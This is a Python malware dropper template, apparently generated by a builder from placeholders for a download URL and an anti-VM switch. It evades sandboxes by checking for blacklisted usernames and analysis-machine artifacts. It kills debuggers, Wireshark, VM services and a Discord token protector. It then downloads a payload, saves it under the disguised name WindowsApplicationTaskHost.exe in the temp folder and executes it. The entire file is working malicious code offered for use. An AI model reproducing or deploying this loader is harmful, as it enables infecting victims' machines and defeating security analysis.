import requests
import os
import sys
import json
import subprocess

from time import sleep

url = "{downloadurl}"
antivm = "{antivm}"

def geolocate():
    try:
        response = requests.get("https://ipinfo.io/json")
        if response.status_code == 200:
            data = json.loads(response.text)
            return data
        else:
            data = {
    "ip": "Unknown",
    }
            return data
    except:
        data = {
    "ip": "Unknown",
    }
        return data

if antivm:
    BLACKLISTED_USERS = ('vboxuser', 'wdagutilityaccount', 'abby', 'peter wilson', 'hmarc', 'patex', 'john-pc', 'rdhj0cnfevzx', 'keecfmwgj', 'frank', '8nl0colnq5bq', 'lisa', 'john', 'george', 'pxmduopvyx', '8vizsm', 'w0fjuovmccp5a', 'lmvwjj9b', 'pqonjhvwexss', '3u2v9m8', 'julia', 'heuerzl', 'harry johnson', 'j.seance', 'a.monaldo', 'tvm')
    BLACKLISTED_TASKS = ('vmtoolsd', 'vm3dservice', 'fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'vboxservice', 'df5serv', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg', 'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver', 'vmwareservice', 'vmwaretray', 'discordtokenprotector', 'processhacker')

    output = os.popen("whoami").read()
    suspicion = 0
        
    if "admin" in output:
        suspicion += 1
        if geolocate()['ip'].endswith("13"):
            suspicion += 1
        if os.path.exists(f"C:\\Users\\{os.getlogin()}\\.oracle_jre_usage"):
            suspicion += 2
        if os.path.exists(f"C:\\Users\\{os.getlogin()}\\Desktop\\Acrobat Reader DC.lnk"):
            suspicion += 1
        if os.path.exists(f"C:\\Users\\{os.getlogin()}\\Desktop\\VLC media player.lnk"):
            suspicion += 1
    
    if suspicion >= 4:
        os._exit(0)
    
    if os.getlogin() == "Administrator":
        if os.path.exists("C:\\Users\\AppOnFlySupport"):
            if os.path.isdir("C:\\Users\\AppOnFlySupport"):
                if os.path.exists("C:\\Users\\Administrator\\Desktop\\Apps & Software.lnk"):
                    os._exit(0)
    
    result = subprocess.getoutput("tasklist")
    numb = len(result)
    if numb > 0:
        temp = (os.getenv('TEMP'))
        if os.path.isfile(temp + r"\olist.txt"):
            os.system(r"del %temp%\olist.txt /f")
        f1 = open(temp + r"\olist.txt", 'a')
        f1.write(result)
        f1.close()
        final = ""
        with open(f"{os.getenv('TEMP')}\olist.txt") as A:
            final = A.read().lower()
        for task in BLACKLISTED_TASKS:
            if task in final:
                try:
                    kilproc = r"taskkill /IM" + ' "' + task + '.exe' + '" ' + r"/f" 
                    os.system(kilproc)
                except: pass
    try:
        os.remove(f"{temp}\olist.txt")
    except: pass

    if f"{os.getlogin()}".lower() in BLACKLISTED_USERS:
        os._exit(0)


response = requests.get(url)

if response.status_code == 200:
    try:
        if os.path.exists(f"{os.getenv('temp')}\\WindowsApplicationTaskHost.exe"):
            os.remove(f"{os.getenv('temp')}\\WindowsApplicationTaskHost.exe")
        with open(f"{os.getenv('temp')}\\WindowsApplicationTaskHost.exe", "wb") as f:
            f.write(response.content)
        os.startfile(f"{os.getenv('temp')}\\WindowsApplicationTaskHost.exe")
    except:
        pass
    sleep(2)
    os._exit(0)